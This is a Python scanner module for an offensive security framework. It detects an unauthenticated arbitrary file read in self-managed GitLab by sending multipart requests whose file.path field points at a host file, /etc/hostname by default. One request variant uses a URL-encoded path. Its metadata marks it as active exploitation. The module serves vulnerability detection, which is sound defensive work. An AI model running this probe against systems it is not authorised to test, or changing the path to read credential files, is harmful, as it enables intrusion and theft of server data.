#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detect GitLab CVE-2026-85706 unauthenticated file.path LFI on repository commits API."""

import json
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "GitLab CVE-2026-85706 File Path LFI Detect",
        "description": (
            "Detects CVE-2026-85706 in self-managed GitLab CE/EE before patched releases "
            "(17.11.7, 18.0.4, 18.1.2, 18.2.2, 18.3.2, 18.4.0): unauthenticated multipart "
            "uploads can supply file.path or metadata.path outside Workhorse temp dirs, "
            "leading to arbitrary file read. Sends a benign absolute-path probe only."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2026-85706"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-85706",
            "https://about.gitlab.com/releases/2026/09/11/security-release-gitlab-18-4-0-released/",
        ],
        "tags": [
            "web",
            "scanner",
            "gitlab",
            "lfi",
            "path-traversal",
            "api",
            "cve-2026-85706",
            "kev",
            "vuln",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe", "active_exploitation"],
            "expected_requests": 4,
            "reversible": True,
            "approval_required": True,
            "produces": ["tech_hints", "risk_signals", "exploit_paths"],
            "cost": 1.2,
            "noise": 0.35,
            "value": 1.2,
            "requires": {
                "tech_hints_any": ["gitlab"],
                "endpoint_pattern_any": ["/api/v4/"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "lfi", "from_detail": "file.path multipart"},
                ],
                "suggested_followups": [
                    "scanner/http/gitlab_detect",
                ],
            },
        },
    }

    project_id = OptInteger(1, "GitLab project ID used for the commits API probe", False, advanced=True)
    probe_path = OptString(
        "/etc/hostname",
        "Absolute host path referenced in file.path (read-only probe)",
        False,
        advanced=True,
    )

    def _gitlab(self) -> bool:
        for path in ("/users/sign_in", "/api/v4/version", "/-/readiness"):
            response = self.http_request(method="GET", path=path, allow_redirects=True)
            if not response:
                continue
            headers = {k.lower(): v for k, v in (response.headers or {}).items()}
            body = (response.text or "").lower()
            if "x-gitlab" in headers or "gitlab" in body:
                return True
        return False

    @staticmethod
    def _multipart(path_value: str) -> tuple[str, str]:
        boundary = f"Kitty{secrets.token_hex(12)}"
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="file.path"\r\n\r\n'
            f"{path_value}\r\n"
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="file"\r\n\r\n\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="file.size"\r\n\r\n'
            f"1\r\n"
            f"--{boundary}--\r\n"
        )
        headers = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
        return body, headers

    def _probe(self, api_path: str, path_value: str):
        body, headers = self._multipart(path_value)
        return self.http_request(
            method="POST",
            path=api_path,
            headers=headers,
            data=body.encode("utf-8"),
            allow_redirects=False,
        )

    @staticmethod
    def _vulnerable_signal(response, path_value: str) -> bool:
        if not response:
            return False
        text = response.text or ""
        code = int(response.status_code or 0)
        lowered = text.lower()
        if path_value.lower() in lowered:
            return True
        if "file.path" in lowered and code in (400, 403, 500):
            try:
                payload = json.loads(text)
            except Exception:
                payload = {}
            if isinstance(payload, dict):
                message = str(payload.get("message") or payload.get("error") or "")
                if path_value.split("/")[-1] in message or "file.path" in message:
                    return True
        return False

    def run(self):
        if not self._gitlab():
            return False

        project = int(self.project_id or 1)
        target_path = str(self.probe_path or "/etc/hostname").strip()
        candidates = (
            f"/api/v4/projects/{project}/repository/commits",
            f"/api/v4/projects/{project}/repository/%63ommits",
            f"/api/v4/projects/{project}/repository/commits/",
        )
        for api_path in candidates:
            response = self._probe(api_path, target_path)
            if self._vulnerable_signal(response, target_path):
                self.set_info(
                    severity="critical",
                    cve="CVE-2026-85706",
                    reason="GitLab accepted out-of-sandbox file.path on repository commits API",
                    path=api_path,
                    probe_path=target_path,
                )
                return True
        return False
